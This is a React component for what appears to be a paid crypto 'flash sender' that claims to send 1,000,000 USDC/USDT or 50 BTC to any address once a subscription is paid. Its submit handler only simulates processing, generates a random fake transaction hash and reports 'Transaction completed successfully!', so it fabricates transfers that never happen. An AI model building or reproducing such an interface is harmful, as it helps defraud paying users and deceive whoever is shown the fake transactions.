import { useState, useMemo } from "react";
import { motion } from "framer-motion";
import { QrCode, Wallet, Lock, Crown } from "lucide-react";
import { useWeb3Modal } from "@web3modal/wagmi/react";
import { useAccount } from "wagmi";
import TokenSelector, { Token } from "./TokenSelector";
import WalletSelector, { Wallet as WalletType } from "./WalletSelector";
import AddressInput from "./AddressInput";
import AboutSection from "./AboutSection";
import StatusMessage, { StatusType } from "./StatusMessage";
import ProcessingModal from "./ProcessingModal";
import SuccessModal from "./SuccessModal";
import PaymentQRModal from "./PaymentQRModal";
import { useSubscription } from "@/hooks/useSubscription";
import { useTelegramUser } from "@/hooks/useTelegramUser";

const InjectionCard = () => {
  const [selectedToken, setSelectedToken] = useState("usdc");
  const [selectedWallet, setSelectedWallet] = useState("trust");
  const [address, setAddress] = useState("");
  const [isTouched, setIsTouched] = useState(false);
  const [status, setStatus] = useState<{ type: StatusType; message: string }>({
    type: null,
    message: "",
  });
  const [isProcessing, setIsProcessing] = useState(false);
  const [showSuccess, setShowSuccess] = useState(false);
  const [txHash, setTxHash] = useState("");
  const [showPaymentQR, setShowPaymentQR] = useState(false);

  const { open } = useWeb3Modal();
  const { isConnected } = useAccount();
  const { user: telegramUser } = useTelegramUser();
  const { isActive: hasActiveSubscription, isVIP, loading: subscriptionLoading, isAuthenticated } = useSubscription(telegramUser?.username);

  const canSend = (hasActiveSubscription || isVIP) && isAuthenticated;

  const tokenData: Record<string, { symbol: string; amount: string }> = {
    usdc: { symbol: "USDC", amount: "1,000,000 USDC" },
    usdcz: { symbol: "USDC.z", amount: "1,000,000 USDC.z" },
    usdt: { symbol: "USDT", amount: "1,000,000 USDT" },
    usdtz: { symbol: "USDT.z", amount: "1,000,000 USDT.z" },
    btc: { symbol: "BTC", amount: "50 BTC" },
    btcz: { symbol: "BTC.z", amount: "50 BTC.z" },
  };

  const currentToken = tokenData[selectedToken];
  const isBTC = selectedToken === "btc";

  const isValidAddress = useMemo(() => {
    if (!address) return false;
    if (isBTC) {
      // Basic Bitcoin address validation
      return /^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,62}$/.test(address);
    }
    // EVM address validation
    return /^0x[a-fA-F0-9]{40}$/.test(address);
  }, [address, isBTC]);

  const handleTokenSelect = (token: Token) => {
    setSelectedToken(token.id);
    setAddress("");
    setIsTouched(false);
    setStatus({ type: null, message: "" });
  };

  const handleWalletSelect = (wallet: WalletType) => {
    setSelectedWallet(wallet.id);
  };

  const handleAddressChange = (value: string) => {
    setAddress(value);
    if (!isTouched) setIsTouched(true);
  };

  const handleSubmit = async () => {
    if (!isValidAddress) {
      setStatus({
        type: "error",
        message: "Please enter a valid wallet address",
      });
      return;
    }

    setIsProcessing(true);
    setStatus({ type: null, message: "" });

    // Simulate processing
    await new Promise((resolve) => setTimeout(resolve, 3000));

    setIsProcessing(false);
    setTxHash("0x" + Array(64).fill(0).map(() => Math.floor(Math.random() * 16).toString(16)).join(""));
    setShowSuccess(true);
  };

  const handleCloseSuccess = () => {
    setShowSuccess(false);
    setAddress("");
    setIsTouched(false);
    setStatus({
      type: "success",
      message: "Transaction completed successfully!",
    });
  };

  return (
    <>
      <motion.div
        initial={{ opacity: 0, y: 10 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.3 }}
        className="glass-card card-glow p-3 sm:p-5 w-full max-w-md mx-auto"
      >
        <AboutSection />

        <div className="h-px w-full my-3 sm:my-4 bg-border/30" />

        <div className="space-y-3 sm:space-y-4">
          <TokenSelector
            selectedToken={selectedToken}
            onSelect={handleTokenSelect}
          />

          <WalletSelector
            selectedWallet={selectedWallet}
            onSelect={handleWalletSelect}
          />

          <AddressInput
            value={address}
            onChange={handleAddressChange}
            tokenSymbol={currentToken.symbol}
            isValid={isValidAddress}
            isTouched={isTouched}
          />

          <motion.button
            whileHover={{ scale: canSend && isValidAddress ? 1.02 : 1 }}
            whileTap={{ scale: canSend && isValidAddress ? 0.98 : 1 }}
            onClick={handleSubmit}
            disabled={!canSend || !isValidAddress || isProcessing}
            className={`w-full text-sm sm:text-base py-2.5 sm:py-3 relative ${canSend ? 'btn-gold shimmer' : 'bg-muted text-muted-foreground cursor-not-allowed rounded-xl px-4 font-semibold'}`}
          >
            {isVIP && canSend && (
              <Crown className="w-3.5 h-3.5 absolute left-3 top-1/2 -translate-y-1/2 text-background" />
            )}
            {!canSend && (
              <Lock className="w-3.5 h-3.5 absolute left-3 top-1/2 -translate-y-1/2" />
            )}
            {subscriptionLoading ? "Checking..." : canSend ? (isVIP ? `VIP: Send ${currentToken.amount}` : `Send ${currentToken.amount}`) : "Pay to Unlock"}
          </motion.button>

          {/* Action buttons row */}
          <div className="flex gap-2">
            <motion.button
              whileHover={{ scale: 1.02 }}
              whileTap={{ scale: 0.98 }}
              onClick={() => setShowPaymentQR(true)}
              className="flex-1 flex items-center justify-center gap-1.5 px-3 py-2 rounded-xl bg-secondary/50 hover:bg-secondary border border-border/50 hover:border-primary/30 text-foreground font-medium text-xs sm:text-sm transition-all"
            >
              <QrCode className="w-3.5 h-3.5 text-primary" />
              <span>Pay</span>
            </motion.button>

            <motion.button
              whileHover={{ scale: 1.02 }}
              whileTap={{ scale: 0.98 }}
              onClick={() => open()}
              className="flex-1 flex items-center justify-center gap-1.5 px-3 py-2 rounded-xl bg-primary/10 hover:bg-primary/20 border border-primary/30 hover:border-primary/50 text-primary font-medium text-xs sm:text-sm transition-all"
            >
              <Wallet className="w-3.5 h-3.5" />
              <span>{isConnected ? "Connected" : "Connect"}</span>
            </motion.button>
          </div>
          
          <StatusMessage type={status.type} message={status.message} />
        </div>
      </motion.div>

      <ProcessingModal isOpen={isProcessing} />
      
      <SuccessModal
        isOpen={showSuccess}
        onClose={handleCloseSuccess}
        txHash={txHash}
        tokenSymbol={currentToken.symbol}
      />

      <PaymentQRModal
        isOpen={showPaymentQR}
        onClose={() => setShowPaymentQR(false)}
      />
    </>
  );
};

export default InjectionCard;
